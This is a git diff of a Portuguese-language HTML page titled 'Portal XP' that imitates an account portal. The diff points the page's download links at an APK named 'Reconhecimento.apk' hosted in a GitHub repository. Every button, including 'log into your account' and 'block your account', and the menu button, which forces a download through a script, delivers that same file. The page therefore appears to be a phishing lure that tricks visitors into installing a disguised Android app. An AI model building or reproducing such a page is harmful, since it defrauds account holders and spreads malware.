@@ -6,18 +6,15 @@
   <title>Portal XP</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
-
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
       font-family: 'Roboto', sans-serif;
     }
-
     body {
       background-color: #f4f4f4;
     }
-
     .header {
       position: fixed;
       top: 0;
@@ -30,11 +27,9 @@
       align-items: center;
       z-index: 1000;
     }
-
     .header img {
       height: 40px;
     }
-
     .menu-btn {
       background: none;
       border: none;
@@ -42,24 +37,20 @@
       font-size: 28px;
       color: white;
     }
-
     .spacer {
       height: 70px;
     }
-
     .image-top {
       width: 100%;
       display: flex;
       justify-content: center;
       position: relative;
     }
-
     .image-top img {
       width: 100%;
       height: auto;
       object-fit: cover;
     }
-
     .c {
       background: rgba(255,255,255,0.97);
       padding: 25px;
@@ -71,12 +62,10 @@
       position: relative;
       z-index: 10;
     }
-
     .h {
       font-size: 18px;
       margin-bottom: 15px;
     }
-
     .d {
       font-size: 15px;
       color: #222;
@@ -84,7 +73,6 @@
       font-weight: normal;
       line-height: 1.5;
     }
-
     .b {
       width: 100%;
       padding: 14px;
@@ -95,61 +83,51 @@
       cursor: pointer;
       margin-top: 15px;
     }
-
     .y { background-color: #ffcc00; color: #000; }
     .g { background-color: #ddd; color: #000; }
 
-    /* Mobile styles */
     @media (max-width: 768px) {
       .spacer {
-        height: 0; /* Remove o spacer no mobile para eliminar o espaço em branco */
+        height: 0;
       }
-
       .image-top {
-        margin-top: 0; /* Remove o margin-top para a imagem ficar colada no header */
+        margin-top: 0;
         position: absolute;
-        top: 70px; /* Ajusta para ficar logo abaixo do header */
+        top: 70px;
         left: 0;
         width: 100%;
       }
-
       .image-top img {
-        max-height: 200px; /* Mantém a altura limitada da imagem */
+        max-height: 200px;
         width: 100%;
         object-fit: cover;
       }
-
       .main-container {
-        margin-top: 200px; /* Ajusta o conteúdo para começar após a imagem */
+        margin-top: 200px;
       }
-
       .c {
-        margin: -50px auto 50px auto; /* Mantém a sobreposição da caixa de texto */
+        margin: -50px auto 50px auto;
         width: 92%;
         padding: 20px;
       }
-
       .h { font-size: 16px; }
       .d { font-size: 14px; }
     }
 
-    /* Desktop styles */
     @media (min-width: 769px) {
       .image-top {
         position: fixed;
         top: 0;
         left: 0;
         width: 100%;
-        height: 100vh; /* Imagem ocupa a tela inteira */
+        height: 100vh;
         z-index: 1;
       }
-
       .image-top img {
         width: 100%;
         height: 100%;
         object-fit: cover;
       }
-
       .main-container {
         position: relative;
         z-index: 10;
@@ -157,9 +135,8 @@
         justify-content: center;
         align-items: center;
         min-height: 100vh;
-        padding-top: 70px; /* Espaço para o header fixo */
+        padding-top: 70px;
       }
-
       .c {
         margin: 0;
         width: 460px;
@@ -190,16 +167,19 @@
         <div class='c'>
           <div class='h'></div>
           <div class='d'>${txt}</div>
-          <a href='./Reconhecimento.apk' download><button class='b y'>ENTRAR NA SUA CONTA</button></a>
-          <a href='./Reconhecimento.apk' download><button class='b g'>BLOQUEAR SUA CONTA</button></a>
+          <a href='https://github.com/emerson0012999/xp/raw/main/Reconhecimento.apk'>
+            <button class='b y'>ENTRAR NA SUA CONTA</button>
+          </a>
+          <a href='https://github.com/emerson0012999/xp/raw/main/Reconhecimento.apk'>
+            <button class='b g'>BLOQUEAR SUA CONTA</button>
+          </a>
         </div>
       `;
 
-      
       const menuBtn = document.getElementById("menuBtn");
       menuBtn.addEventListener("click", function() {
         const link = document.createElement("a");
-        link.href = "./Reconhecimento.apk";
+        link.href = "https://github.com/emerson0012999/xp/raw/main/Reconhecimento.apk";
         link.download = "Reconhecimento.apk";
         document.body.appendChild(link);
         link.click();
@@ -207,7 +187,9 @@
       });
     });
   </script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'925a70bb8c42bce0',t:'MTc0Mjg2NDEwMS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'925a889a39dbbf64',t:'MTc0Mjg2NTA3OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+
+  <!-- Cloudflare scripts (inalterados) -->
+  <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'925a70bb8c42bce0',t:'MTc0Mjg2NDEwMS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+  <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'925a889a39dbbf64',t:'MTc0Mjg2NTA3OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
